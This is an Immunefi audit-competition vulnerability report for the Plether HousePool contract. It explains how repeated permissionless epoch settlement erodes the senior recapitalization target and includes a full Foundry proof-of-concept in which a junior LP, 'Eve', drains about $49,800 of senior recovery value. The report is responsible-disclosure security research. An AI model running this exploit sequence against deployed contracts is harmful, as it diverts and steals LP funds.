# \#100070 [SC-High] Repeated settlement lowers the senior recovery target from residual recap intent

**Submitted on Nov 16th 2026 at 07:22:55 UTC by @OxVrka for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #100070
- **Report Type:** Smart Contract
- **Report severity:** High
- **Target:** https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol
- **Impacts:**
  - Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

## Description

## Brief/Intro

During recovery from a full principal wipe, each public epoch settlement uses the remaining recap bucket as the senior high-water mark. Because the bucket shrinks after each settlement, repeated calls erode the owner-funded senior target and later route trading revenue to junior LPs.

## Vulnerability Details

The branch is reached after market losses wipe both principals, the owner funds documented recapitalization and clears degraded mode, and any caller settles an LP epoch. These are the documented recovery and public settlement paths.

The bootstrap branch restores the settleable recap to senior and overwrites its high-water mark with the target passed by the application:

```solidity
if (state.waterfall.seniorPrincipal == 0 && state.waterfall.juniorPrincipal == 0) {
    state.waterfall.seniorPrincipal += remaining;
    state.waterfall.seniorHighWaterMark =
        recapitalizationTargetAssets > remaining ? recapitalizationTargetAssets : remaining;
    remaining = 0;
}
```

The live application passes the current pending recap buckets as both the amount to apply and the target, then reduces those buckets by the amount settled. On the next call, the target is therefore the smaller residual, not the owner’s original recovery target:

```solidity
applyPendingClaimantBucketsPreview(state, settleableClaimantBuckets, claimantBuckets, allowRevenueContinuation);
_decreasePendingClaimantBuckets(settleableClaimantBuckets);
```

The settleable amount is capped by the same distributable balance each time. Reconcile reserves that amount from distributable before running the ordinary loss waterfall, so the waterfall cannot see the value reserved for recap.

The waterfall can push the restored senior principal back to zero while preserving the high-water mark. The same settlement then bootstraps senior again from the pending recap, but now uses the reduced residual as its target.

The recovery target must be stored independently from the decremented pending bucket; the bootstrap must use the owner-committed target, not the residual intent.

## Impact Details

Repeated permissionless settlement can reduce the senior recovery target as pending recapitalization is consumed. This reduces the amount senior can later recover even though settlement itself moves no cash or shares.

When trading revenue later arrives, accounting restores senior only to the reduced mark and assigns the remaining value to junior claims. This reverses the intended allocation of owner-funded recovery and leaves senior underpaid.

Any junior LP can benefit through permissionless settlement and redemption after principal losses and the documented owner-funded recovery. The PoC demonstrates direct withdrawal by a junior attacker of value diverted from senior’s recovery.

## Link to Proof of Concept

https://gist.github.com/0xVrka/5cd934ff53ba2df531aaf3bd22df7de3

## Proof of Concept

## Proof of Concept
```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {CfdEngine} from "@plether/perps/CfdEngine.sol";
import {CfdEngineAdmin} from "@plether/perps/CfdEngineAdmin.sol";
import {CfdEngineLens} from "@plether/perps/CfdEngineLens.sol";
import {CfdEnginePlanner} from "@plether/perps/CfdEnginePlanner.sol";
import {CfdEngineSettlementSidecar} from "@plether/perps/CfdEngineSettlementSidecar.sol";
import {CfdOrderPolicyEvaluator} from "@plether/perps/CfdOrderPolicyEvaluator.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {HousePool} from "@plether/perps/HousePool.sol";
import {HousePoolRedemptionMathSidecar} from "@plether/perps/HousePoolRedemptionMathSidecar.sol";
import {PletherOracle} from "@plether/perps/PletherOracle.sol";
import {MarginClearinghouse} from "@plether/perps/MarginClearinghouse.sol";
import {OrderLifecycleBook} from "@plether/perps/OrderLifecycleBook.sol";
import {OrderRouter} from "@plether/perps/OrderRouter.sol";
import {OrderRouterExecutionSidecar} from "@plether/perps/OrderRouterExecutionSidecar.sol";
import {OrderRouterLiquidationBatchSidecar} from "@plether/perps/OrderRouterLiquidationBatchSidecar.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {TerminalNavBookV2} from "@plether/perps/TerminalNavBookV2.sol";
import {TrancheVault} from "@plether/perps/TrancheVault.sol";
import {IHousePool} from "@plether/perps/interfaces/IHousePool.sol";
import {ICfdEngineRiskParamsView} from "@plether/perps/interfaces/ICfdEngineRiskParamsView.sol";
import {MockSettlementToken} from "../utils/MockSettlementToken.sol";
import {MockPyth} from "@plether/test-utils/MockPyth.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {Test} from "forge-std/Test.sol";

/// @dev Release-only constructor wrappers copied verbatim from script/DeployPerpsArbitrumSepolia.s.sol
///      so the test is self-contained against the package's own import roots.
contract ArbitrumSepoliaReleaseHousePool is HousePool {

    constructor(
        address settlementToken,
        address engine,
        address redemptionMathSidecar
    ) HousePool(settlementToken, engine, redemptionMathSidecar) {
        poolConfig.maxSeniorExposureAssets = 40_000_000e6;
        poolConfig.maxSeniorShareBps = 8000;
        _validatePoolConfig(poolConfig);
    }

}

contract ArbitrumSepoliaReleaseOracle is PletherOracle {

    constructor(
        address engine,
        address housePool,
        address pyth,
        bytes32[] memory feedIds,
        uint256[] memory quantities,
        uint256[] memory basePrices,
        bool[] memory inversions
    ) PletherOracle(engine, housePool, pyth, feedIds, quantities, basePrices, inversions) {
        adverseConfidenceMultiplierBps = 2500;
    }

}

contract ArbitrumSepoliaReleaseRouter is OrderRouter {

    constructor(
        address engine,
        address engineLens,
        address housePool,
        address pletherOracle_,
        address keeperSidecar,
        address policyEvaluator,
        address executionSidecar,
        address lifecycleBook
    )
        OrderRouter(
            engine,
            engineLens,
            housePool,
            pletherOracle_,
            keeperSidecar,
            policyEvaluator,
            executionSidecar,
            lifecycleBook
        )
    {
        minOpenNotionalAssets = 1000e6;
    }

}

/// @dev Ordinary trader/keeper calls bundled by one externally controlled account.
contract TraderActor {

    OrderRouter internal immutable router;
    IERC20 internal immutable settlementToken;
    MarginClearinghouse internal immutable clearinghouse;

    constructor(
        OrderRouter router_,
        IERC20 settlementToken_,
        MarginClearinghouse clearinghouse_
    ) {
        router = router_;
        settlementToken = settlementToken_;
        clearinghouse = clearinghouse_;
    }

    function deposit(uint256 assets) external {
        settlementToken.approve(address(clearinghouse), assets);
        clearinghouse.deposit(address(this), assets);
    }

    function commit(OrderV3Types.OrderRequest calldata request) external returns (uint64 orderId) {
        return router.commitOrder(request);
    }

    function execute(
        uint64 orderId,
        bytes[] calldata pythUpdateData
    ) external returns (OrderV3Types.ExecutionResult memory result) {
        return router.executeOrder(orderId, pythUpdateData);
    }
}

contract SeniorRecoveryTargetErosionTest is Test {

    uint256 internal constant START_TIME = 1_709_532_000; // Monday 00:00 UTC
    uint256 internal constant UNIT_MARK = 100_000_000; // 1.00 in eight-decimal price units
    uint32 internal constant CAP_PRICE = 2e8;

    // LP premise: J0 = 122_000e6, S0 = HWM0 = 200_000e6, pool cash 322_000e6; the
    // junior slack keeps the final catastrophe open inside the release solvency buffer.
    uint256 internal constant JUNIOR_EVE_DEPOSIT = 121_999e6;
    uint256 internal constant SENIOR_ALICE_DEPOSIT = 199_999e6;
    uint256 internal constant RECOVERY_TARGET = 200_000e6; // owner's full recapitalization intent
    uint256 internal constant TARGET_D = 80_000e6; // pinned terminal distributable

    address internal constant ALICE = address(0xA11); // victim senior LP
    address internal constant EVE = address(0xE7E); // attacker junior LP

    bytes32 internal constant PYTH_EUR_USD = 0xa995d00bb36a63cef7fd2c287dc105fc8f3d93779f062f09551b0af3e81ec30b;
    bytes32 internal constant PYTH_USD_JPY = 0xef2c98c804ba503c6a707e38be4dfbb16683775f195b091252bf24693042fd52;
    bytes32 internal constant PYTH_GBP_USD = 0x84c2dde9633d93d1bcad84e7dc41c9d56578b7ec52fabedc1f335d673df0a7c1;
    bytes32 internal constant PYTH_USD_CAD = 0x3112b03a41c910ed446852aacf67118cb1bec67b2cd0b9a214c58cc0eaa2ecca;
    bytes32 internal constant PYTH_USD_SEK = 0x8ccb376aa871517e807358d4e3cf0bc7fe4950474dbe6c9ffc21ef64e43fc676;
    bytes32 internal constant PYTH_USD_CHF = 0x0b1e3297e69f162877b577b0d6a47a0d63b2392bc8499e6540da4187a63e28f8;

    MockSettlementToken internal settlementToken;
    MockPyth internal pyth;
    MarginClearinghouse internal clearinghouse;
    CfdEngine internal engine;
    CfdEngineLens internal engineLens;
    ArbitrumSepoliaReleaseHousePool internal pool;
    TrancheVault internal seniorVault;
    TrancheVault internal juniorVault;
    ArbitrumSepoliaReleaseRouter internal router;
    OrderLifecycleBook internal lifecycleBook;
    ArbitrumSepoliaReleaseOracle internal oracle;

    uint64 internal fixtureTime;
    mapping(address => uint256) internal redeemRequest;

    function setUp() public {
        _warpTo(START_TIME);

        settlementToken = new MockSettlementToken();
        clearinghouse = new MarginClearinghouse(address(settlementToken));
        engine = new CfdEngine(address(settlementToken), address(clearinghouse), CAP_PRICE, _riskParams(), 50);
        TerminalNavBookV2 terminalBook = new TerminalNavBookV2(address(engine), CAP_PRICE);
        engine.setTerminalNavBook(address(terminalBook));

        CfdEnginePlanner planner = new CfdEnginePlanner();
        CfdEngineSettlementSidecar settlement = new CfdEngineSettlementSidecar(address(engine));
        CfdEngineAdmin engineAdmin = new CfdEngineAdmin(address(engine), address(this));
        engine.setDependencies(address(planner), address(settlement), address(engineAdmin));

        engineLens = new CfdEngineLens(address(engine));
        HousePoolRedemptionMathSidecar poolMath = new HousePoolRedemptionMathSidecar();
        pool = new ArbitrumSepoliaReleaseHousePool(address(settlementToken), address(engine), address(poolMath));
        seniorVault = new TrancheVault(
            IERC20(address(settlementToken)), address(pool), true, "Plether Senior LP", "psLP", 0, address(0)
        );
        juniorVault = new TrancheVault(
            IERC20(address(settlementToken)), address(pool), false, "Plether Junior LP", "pjLP", 0, address(this)
        );
        pool.setSeniorVault(address(seniorVault));
        pool.setJuniorVault(address(juniorVault));
        engine.setPool(address(pool));

        pyth = new MockPyth();
        oracle = new ArbitrumSepoliaReleaseOracle(
            address(engine),
            address(pool),
            address(pyth),
            _feedIds(),
            _feedWeights(),
            _feedBases(),
            _feedInversions()
        );
        CfdOrderPolicyEvaluator evaluator = new CfdOrderPolicyEvaluator();
        OrderRouterExecutionSidecar execution = new OrderRouterExecutionSidecar();

        address predictedRouter = vm.computeCreateAddress(address(this), vm.getNonce(address(this)) + 2);
        lifecycleBook = new OrderLifecycleBook(
            predictedRouter, address(engine), address(clearinghouse), address(pool)
        );
        OrderRouterLiquidationBatchSidecar liquidation = new OrderRouterLiquidationBatchSidecar(predictedRouter);
        router = new ArbitrumSepoliaReleaseRouter(
            address(engine),
            address(engineLens),
            address(pool),
            address(oracle),
            address(liquidation),
            address(evaluator),
            address(execution),
            address(lifecycleBook)
        );
        assertEq(address(router), predictedRouter);
        engine.setOrderRouter(address(router));
        clearinghouse.setEngine(address(engine));

        // Documented bootstrap: $1 seed per tranche, then trading activates.
        settlementToken.mint(address(this), 2e6);
        settlementToken.approve(address(pool), 2e6);
        pool.initializeSeedPosition(false, 1e6, address(this));
        pool.initializeSeedPosition(true, 1e6, address(this));
        pool.activateTrading();

        // Release configuration in force from construction (DEPLOYMENT.md table).
        CfdTypes.RiskParams memory risk = ICfdEngineRiskParamsView(address(engine)).riskParams();
        assertEq(risk.vpiFactor, 0.01e18, "release VPI factor");
        assertEq(risk.maxSkewRatio, 0.4e18, "release skew cap");
        assertEq(risk.maintMarginBps, 10, "release maintenance margin");
        assertEq(risk.initMarginBps, 20, "release initial margin");
        assertEq(risk.fadMarginBps, 300, "release FAD margin");
        assertEq(risk.baseCarryBps, 500, "release carry rate");
        assertEq(risk.minBountyAssets, 1e6, "release minimum liquidation charge");
        assertEq(risk.bountyBps, 10, "release liquidation charge rate");
        assertEq(risk.keeperShareBps, 5000, "release keeper share");
        assertEq(risk.protocolShareBps, 0, "release treasury share");
        assertEq(engine.settlementBufferBps(), 25, "release settlement buffer");
        assertEq(pool.maxSeniorExposureAssets(), 40_000_000e6, "release senior exposure cap");
        assertEq(pool.maxSeniorShareBps(), 8000, "release senior share cap");
        assertEq(pool.seniorRateBps(), 800, "release senior rate");
        assertEq(router.minOpenNotionalAssets(), 1000e6, "release minimum open notional");
        assertEq(router.maxExecutionWindowSeconds(), 60, "release order deadline window");
        assertEq(oracle.adverseConfidenceMultiplierBps(), 2500, "release adverse confidence multiplier");
        assertEq(engine.CAP_PRICE(), CAP_PRICE, "release price cap");
    }

    /// @notice End-to-end reproduction: repeated epoch reconciles re-bootstrap the senior
    ///         recovery target from the residual recapitalization intent and divert the
    ///         senior restoration domain to the junior owners.
    function test_RepeatedReconcilesErodeTargetAndDivertRestoration() public {
        // Junior is funded first so the senior share stays under the release 80% cap.
        _lpDeposit(juniorVault, EVE, JUNIOR_EVE_DEPOSIT);
        _lpDeposit(seniorVault, ALICE, SENIOR_ALICE_DEPOSIT);

        // A dust junior redemption queued while the tranche is healthy; after the wipe
        // its zero-quote refund still counts as settlement progress.
        _markAndRequestRedeem(juniorVault, EVE, juniorVault.balanceOf(EVE) / 100);
        uint256 dustHead = redeemRequest[EVE];

        _catastrophe();

        // The owner's designed recovery procedure, which the defect corrupts.
        _ownerRecovery();

        uint256 cash = pool.totalAssets();
        uint256 seniorSharesBefore = seniorVault.balanceOf(ALICE);
        uint256 juniorSupplyBefore = juniorVault.accruedTotalSupply();

        // Attack tx 1: the wipe settle recognizes the loss (S=J wiped) and the recap
        // bootstraps at the full owner intent.
        _settleHead(dustHead);
        assertApproxEqAbs(pool.seniorPrincipal(), 80_000e6, 1_000e6, "settle 1: S = D");
        assertApproxEqAbs(pool.seniorHighWaterMark(), 200_000e6, 1_000e6, "settle 1: target keeps full intent");
        assertApproxEqAbs(pool.juniorPrincipal(), 0, 1_000e6, "settle 1: junior stays zero");
        assertApproxEqAbs(
            pool.pendingRecapitalizationAssets(), 120_000e6, 1_000e6, "settle 1: residual intent"
        );
        vm.prank(EVE);
        juniorVault.claimRedeemRefund(dustHead, EVE, EVE);

        // Attack tx 2: a full-balance cycle at unchanged cash. The reserved recap makes
        // the waterfall absorb S back to zero and the same epoch re-bootstraps it
        // against the residual intent, replacing the owner's target.
        _eveCycleSettle();
        assertApproxEqAbs(pool.seniorPrincipal(), 80_000e6, 1_000e6, "settle 2: S re-seeded at D");
        assertApproxEqAbs(pool.seniorHighWaterMark(), 120_000e6, 1_000e6, "EROSION: target replaced by residual");
        assertApproxEqAbs(pool.juniorPrincipal(), 0, 1_000e6, "settle 2: junior still zero");
        assertApproxEqAbs(
            pool.pendingRecapitalizationAssets(), 40_000e6, 1_000e6, "settle 2: intent 200k -> 40k"
        );
        assertEq(pool.totalAssets(), cash, "settle 2: no cash moved");
        assertEq(seniorVault.balanceOf(ALICE), seniorSharesBefore, "no senior withdrawal");

        // Attack tx 3: the same cycle retires the residual intent.
        _eveCycleSettle();
        assertApproxEqAbs(pool.seniorPrincipal(), 80_000e6, 1_000e6, "settle 3: S unchanged");
        assertApproxEqAbs(pool.seniorHighWaterMark(), 120_000e6, 1_000e6, "settle 3: target stays eroded");
        assertEq(pool.pendingRecapitalizationAssets(), 0, "settle 3: intent retired");
        assertEq(pool.totalAssets(), cash, "settle 3: no cash moved");
        assertEq(juniorVault.accruedTotalSupply(), juniorSupplyBefore, "no junior shares burned");

        vm.expectRevert(IHousePool.HousePool__NoLpEpochProgress.selector);
        pool.settleLpEpoch(0, 0);

        // Damage materialization: ordinary losing trades lift the distributable.
        _losingTradeRound();
        _losingTradeRound();
        _losingTradeRound();
        assertApproxEqAbs(
            pool.totalAssets() - engine.totalTraderClaimBalanceAssets(),
            170_000e6,
            1_000e6,
            "revenue lifts D to 170_000e6"
        );

        // alice's redemption: senior restores only to the eroded mark and the rest of
        // the restoration domain lands in junior.
        _markAndRequestRedeem(seniorVault, ALICE, seniorVault.balanceOf(ALICE));
        _settleHead(redeemRequest[ALICE]);
        assertApproxEqAbs(pool.juniorPrincipal(), 50_000e6, 1_000e6, "restoration domain leaked to junior");
        uint256 alicePaid = seniorVault.maxWithdraw(ALICE);
        vm.prank(ALICE);
        seniorVault.withdraw(alicePaid, ALICE, ALICE);
        emit log_named_uint("ATTACK alice senior paid", alicePaid);

        // eve's exit: she redeems the diverted junior domain.
        uint256 eveTokensBefore = settlementToken.balanceOf(EVE);
        _markAndRequestRedeem(juniorVault, EVE, juniorVault.balanceOf(EVE));
        _settleHead(redeemRequest[EVE]);
        uint256 eveTake = juniorVault.maxWithdraw(EVE);
        vm.prank(EVE);
        juniorVault.withdraw(eveTake, EVE, EVE);
        uint256 eveProfit = settlementToken.balanceOf(EVE) - eveTokensBefore;
        emit log_named_uint("ATTACK eve extraction", eveProfit);
        assertEq(eveProfit, eveTake, "eve had no other token source");
        assertGt(eveTake, 49_000e6, "ATTACK PROFIT: eve drains the senior restoration domain");
        assertEq(pool.seniorPrincipal(), pool.seniorHighWaterMark(), "senior stranded at the eroded mark");
    }

    /// @dev Catastrophe: opposite winners close. Fresh payouts drain pool cash, the
    ///      remaining wins become deferred trader claims, degraded mode latches.
    function _catastrophe() internal {
        TraderActor actorW0 = _newTrader(40_000e6);
        TraderActor actorW1 = _newTrader(40_000e6);
        TraderActor actorW2 = _newTrader(40_000e6);
        TraderActor actorW3 = _newTrader(40_000e6);

        _traderOpen(actorW2, CfdTypes.Side.LONG, 120_000e18, 12_000e6, UNIT_MARK); // +120k net
        _traderOpen(actorW1, CfdTypes.Side.SHORT, 120_000e18, 12_000e6, UNIT_MARK); // net 0
        _traderOpen(actorW2, CfdTypes.Side.LONG, 80_000e18, 8_000e6, UNIT_MARK); // +80k net
        _traderOpen(actorW1, CfdTypes.Side.SHORT, 80_000e18, 8_000e6, UNIT_MARK); // net 0
        _traderOpen(actorW3, CfdTypes.Side.LONG, 60_000e18, 6_000e6, UNIT_MARK); // +60k net
        _traderOpen(actorW1, CfdTypes.Side.SHORT, 60_000e18, 6_000e6, UNIT_MARK); // net 0
        _traderOpen(actorW3, CfdTypes.Side.LONG, 40_000e18, 4_000e6, UNIT_MARK); // +40k net
        _traderOpen(actorW1, CfdTypes.Side.SHORT, 59_200e18, 5_920e6, UNIT_MARK); // net -19.2k
        _traderOpen(actorW0, CfdTypes.Side.LONG, 2_000e18, 2_000e6, UNIT_MARK); // 20 lots, net +0.8k

        _traderClose(actorW1, CfdTypes.Side.SHORT, 319_200e18, 200_000_000); // fresh-paid
        assertTrue(engine.degradedMode(), "catastrophe must latch degraded mode");
        _traderClose(actorW0, CfdTypes.Side.LONG, 2_000e18, 60_000_000); // fresh-paid
        _traderClose(actorW2, CfdTypes.Side.LONG, 200_000e18, 55_000_000); // deferred claim
        _traderClose(actorW3, CfdTypes.Side.LONG, 100_000e18, 58_900_000); // deferred claim
    }

    /// @dev The owner's designed recovery: trim the deficit to the pinned target,
    ///      recapitalize the full intent, clear degraded mode.
    function _ownerRecovery() internal {
        uint256 pinnedDeficit = RECOVERY_TARGET - TARGET_D;
        uint256 claims = engine.totalTraderClaimBalanceAssets();
        uint256 cash = pool.totalAssets();
        uint256 deficit = claims - cash;
        assertGe(deficit, pinnedDeficit, "catastrophe deficit must cover the pinned target");
        if (deficit > pinnedDeficit) {
            settlementToken.mint(address(this), deficit - pinnedDeficit);
            settlementToken.transfer(address(pool), deficit - pinnedDeficit);
            pool.accountExcess();
        }
        settlementToken.mint(address(this), RECOVERY_TARGET);
        settlementToken.approve(address(engine), RECOVERY_TARGET);
        engine.recapitalizePool(RECOVERY_TARGET);
        engine.clearDegradedMode();
        assertApproxEqAbs(pool.seniorHighWaterMark(), RECOVERY_TARGET, 1_000e6, "premise: HWM = full target");
        assertEq(pool.pendingRecapitalizationAssets(), RECOVERY_TARGET, "premise: full intent queued");
        assertEq(
            pool.totalAssets() - engine.totalTraderClaimBalanceAssets(),
            TARGET_D,
            "premise: terminal distributable pinned exactly"
        );
    }

    /// @dev Eve's per-cycle pair: a full-balance redemption request plus a settle
    ///      that refunds it as a zero-quote head.
    function _eveCycleSettle() internal {
        _markAndRequestRedeem(juniorVault, EVE, juniorVault.balanceOf(EVE));
        _settleHead(redeemRequest[EVE]);
        vm.prank(EVE);
        juniorVault.claimRedeemRefund(redeemRequest[EVE], EVE, EVE);
    }

    /// @dev A fresh wallet opens a long through the public router and closes it at
    ///      the cap for a realized 30_000e6 loss, recorded as claimant revenue.
    function _losingTradeRound() internal {
        TraderActor loser =
            new TraderActor(OrderRouter(address(router)), IERC20(address(settlementToken)), clearinghouse);
        settlementToken.mint(address(loser), 40_000e6);
        loser.deposit(40_000e6);
        // The commit preflight plans skew against the cached mark, so pull the
        // basket back to the trading level (permissionless) before each open.
        _warpTo(vm.getBlockTimestamp() + 1);
        router.updateMarkPrice(_uniformData(UNIT_MARK, fixtureTime, engine.lastMarkTime()));
        _traderOpen(loser, CfdTypes.Side.LONG, 30_000e18, 30_000e6, UNIT_MARK);
        _traderClose(loser, CfdTypes.Side.LONG, 30_000e18, 200_000_000);
    }

    function _newTrader(uint256 fund) internal returns (TraderActor actor) {
        actor = new TraderActor(OrderRouter(address(router)), IERC20(address(settlementToken)), clearinghouse);
        settlementToken.mint(address(actor), fund);
        actor.deposit(fund);
    }

    function _traderOpen(
        TraderActor actor,
        CfdTypes.Side side,
        uint256 size,
        uint256 margin,
        uint256 price
    ) internal {
        uint64 orderId = actor.commit(
            _request(
                string(abi.encodePacked("open-", vm.toString(address(actor)), "-", vm.toString(size))),
                side,
                size,
                margin,
                price,
                false
            )
        );
        _executeOrder(actor, orderId, price);
    }

    function _traderClose(TraderActor actor, CfdTypes.Side side, uint256 size, uint256 price) internal {
        uint64 orderId = actor.commit(
            _request(
                string(abi.encodePacked("close-", vm.toString(address(actor)), "-", vm.toString(size))),
                side,
                size,
                0,
                price,
                true
            )
        );
        // A short close requires the executed mark to reach its limit
        // (checkSlippage); inverted-feed rounding lands the basket a few units
        // under nominal, so shorts feed data 0.0005% above. Long closes need the
        // mark under the limit, which the same rounding already ensures.
        _executeOrder(actor, orderId, side == CfdTypes.Side.SHORT ? price + 1_000 : price);
    }

    function _executeOrder(TraderActor actor, uint64 orderId, uint256 price) internal {
        _warpOutOfFreeze();
        _warpTo(vm.getBlockTimestamp() + 2);
        OrderV3Types.ExecutionResult memory result =
            actor.execute(orderId, _uniformData(price, fixtureTime, engine.lastMarkTime()));
        assertEq(
            uint8(result.status), uint8(OrderV3Types.LifecycleStatus.Executed), "ordinary router order executes"
        );
    }

    function _lpDeposit(TrancheVault vault, address lp, uint256 assets) internal {
        settlementToken.mint(lp, assets);
        vm.startPrank(lp);
        settlementToken.approve(address(vault), assets);
        uint256 requestId = vault.requestDeposit(assets, lp, lp);
        vm.stopPrank();
        _settleHead(requestId);
        vm.prank(lp);
        vault.claimDeposit(requestId, assets, lp, lp);
    }

    function _markAndRequestRedeem(TrancheVault vault, address lp, uint256 shares) internal {
        uint256 unlockTime = vault.lastDepositTime(lp) + vault.DEPOSIT_COOLDOWN();
        if (vm.getBlockTimestamp() < unlockTime) {
            _warpTo(unlockTime);
        }
        _warpTo(vm.getBlockTimestamp() + 1);
        router.updateMarkPrice(_uniformData(UNIT_MARK, fixtureTime, engine.lastMarkTime()));
        vm.prank(lp);
        redeemRequest[lp] = vault.requestRedeem(shares, lp, lp);
    }

    function _settleHead(uint256 requestId) internal {
        uint256 maturity = pool.lpEpochStart(requestId);
        if (vm.getBlockTimestamp() < maturity) {
            _warpTo(maturity);
        }
        _warpOutOfFreeze();
        _warpTo(vm.getBlockTimestamp() + 1);
        router.settleLpEpoch(_uniformData(UNIT_MARK, fixtureTime, engine.lastMarkTime()));
    }

    /// @dev Walk the clock out of any FX market-close freeze window. Explicit local
    ///      clock: via_ir can common-subexpression block.timestamp reads across vm.warp.
    function _warpOutOfFreeze() internal {
        uint256 clock = vm.getBlockTimestamp();
        while (engine.isOracleFrozen()) {
            clock += 1 hours;
            vm.warp(clock);
        }
    }

    function _request(
        string memory tag,
        CfdTypes.Side side,
        uint256 size,
        uint256 margin,
        uint256 price,
        bool isClose
    ) internal view returns (OrderV3Types.OrderRequest memory request) {
        request.clientOrderId = keccak256(abi.encode(tag, fixtureTime, address(this)));
        request.side = side;
        request.sizeDelta = size;
        request.marginDelta = margin;
        request.targetPrice = price;
        request.isClose = isClose;
        request.bounds = OrderV3Types.ExecutionBounds({
            submitBy: uint64(vm.getBlockTimestamp() + router.maxExecutionWindowSeconds()),
            executionWindowSeconds: uint32(router.maxExecutionWindowSeconds()),
            allowedExecutionModes: 7,
            expectedConfigHash: lifecycleBook.currentExecutionConfigHash(),
            maxExecutionBountyAssets: type(uint256).max,
            maxExecutionNotionalAssets: type(uint256).max,
            maxGrossAccountDebitAssets: type(uint256).max,
            maxActionChargeAssets: type(uint256).max,
            maxExplicitFeesAssets: type(uint256).max,
            maxPostPositionSize: type(uint256).max,
            minPostSettlementBalanceAssets: 0,
            minPostPositionEquityAssets: 0,
            maxPostLeverageBps: type(uint32).max
        });
    }

    // Release deployment data (script/DeployPerpsArbitrumSepolia.s.sol values).

    function _riskParams() internal pure returns (CfdTypes.RiskParams memory) {
        return CfdTypes.RiskParams({
            vpiFactor: 0.01e18,
            maxSkewRatio: 0.4e18,
            maintMarginBps: 10,
            initMarginBps: 20,
            fadMarginBps: 300,
            baseCarryBps: 500,
            minBountyAssets: 1e6,
            bountyBps: 10,
            keeperShareBps: 5000,
            protocolShareBps: 0
        });
    }

    function _uniformData(
        uint256 targetPrice,
        uint64 publishTime,
        uint64 previousPublishTime
    ) internal pure returns (bytes[] memory updateData) {
        MockPyth.FeedUpdate[] memory updates = new MockPyth.FeedUpdate[](6);
        bytes32[] memory feedIds = _feedIds();
        uint256[] memory bases = _feedBases();
        bool[] memory inversions = _feedInversions();
        for (uint256 i; i < updates.length; ++i) {
            updates[i] = MockPyth.FeedUpdate({
                id: feedIds[i],
                price: MockPyth.MockPrice({
                    price: int64(uint64(_rawFeedPrice(bases[i], targetPrice, inversions[i]))),
                    conf: 0,
                    expo: -8,
                    publishTime: publishTime,
                    prevPublishTime: previousPublishTime
                })
            });
        }
        updateData = new bytes[](1);
        updateData[0] = abi.encode(updates);
    }

    function _rawFeedPrice(
        uint256 basePrice,
        uint256 targetPrice,
        bool inverted
    ) internal pure returns (uint256) {
        if (!inverted) {
            return (basePrice * targetPrice) / 1e8;
        }
        uint256 denominator = basePrice * targetPrice;
        return (1e24 + denominator / 2) / denominator;
    }

    function _feedIds() internal pure returns (bytes32[] memory ids) {
        ids = new bytes32[](6);
        ids[0] = PYTH_EUR_USD;
        ids[1] = PYTH_USD_JPY;
        ids[2] = PYTH_GBP_USD;
        ids[3] = PYTH_USD_CAD;
        ids[4] = PYTH_USD_SEK;
        ids[5] = PYTH_USD_CHF;
    }

    function _feedWeights() internal pure returns (uint256[] memory weights) {
        weights = new uint256[](6);
        weights[0] = 576e15;
        weights[1] = 136e15;
        weights[2] = 119e15;
        weights[3] = 91e15;
        weights[4] = 42e15;
        weights[5] = 36e15;
    }

    function _feedBases() internal pure returns (uint256[] memory bases) {
        bases = new uint256[](6);
        bases[0] = 117_500_000;
        bases[1] = 638_000;
        bases[2] = 134_480_000;
        bases[3] = 72_880_000;
        bases[4] = 10_860_000;
        bases[5] = 126_100_000;
    }

    function _feedInversions() internal pure returns (bool[] memory inversions) {
        inversions = new bool[](6);
        inversions[1] = true;
        inversions[3] = true;
        inversions[4] = true;
        inversions[5] = true;
    }

    function _warpTo(uint256 timestamp) internal {
        if (vm.getBlockTimestamp() < timestamp) {
            vm.roll(vm.getBlockNumber() + 1);
            vm.warp(timestamp);
        }
        fixtureTime = uint64(vm.getBlockTimestamp());
    }
}

```

The attached self-contained Foundry test `SeniorRecoveryTargetErosion.t.sol` deploys the release-configured stack and uses local Pyth data. It has no `LifecycleTestBase.sol` import. Trader opens and closes call `TraderActor.commit` and `TraderActor.execute`, which invoke the public `router.commitOrder` and `router.executeOrder` entrypoints.

1. Eve deposits $121,999 into the $122,000 junior tranche and Alice deposits $199,999 into the $200,000 senior tranche; the $1 seed in each tranche brings pool cash to $322,000. The catastrophe leaves about $131,000 in trader claims. The documented owner recovery queues a $200,000 recap and pins distributable assets at exactly $80,000.
2. Three permissionless settlements produce `(senior principal, senior mark, recap intent)` of approximately `($80,000, $200,000, $120,000)`, then `($80,000, $120,000, $40,000)`, then `($80,000, $120,000, $0)`. Cash and senior shares are unchanged during the ladder.
3. Three ordinary traders each realize a $30,000 loss through public Router orders, raising distributable assets from $80,000 to approximately $170,000.
4. At redemption, the latest run logs $119,999.40 paid to Alice and $49,816.231470 withdrawn by Eve from the value diverted out of senior restoration.

The ladder and final distributable assertions allow up to $1,000 of carry/VPI accounting dust. The test asserts Eve's withdrawal is greater than $49,000; $49,816.231470 and $119,999.40 are the latest logged outputs, not exact-value assertions. The fixture checks the release risk parameters, pool caps, senior rate, minimum open, order window, confidence multiplier, and price cap.

```bash
git clone https://github.com/immunefi-team/audit-comp-plether.git
cd audit-comp-plether
git checkout a82d4fefb02768e5b3bddcc97dee371eee24fea8
cp SeniorRecoveryTargetErosion.t.sol packages/perps/test/perps/
cd packages/perps
forge test --match-contract SeniorRecoveryTargetErosionTest -vv
```

The test uses the checked-in release settings and makes no public network calls.
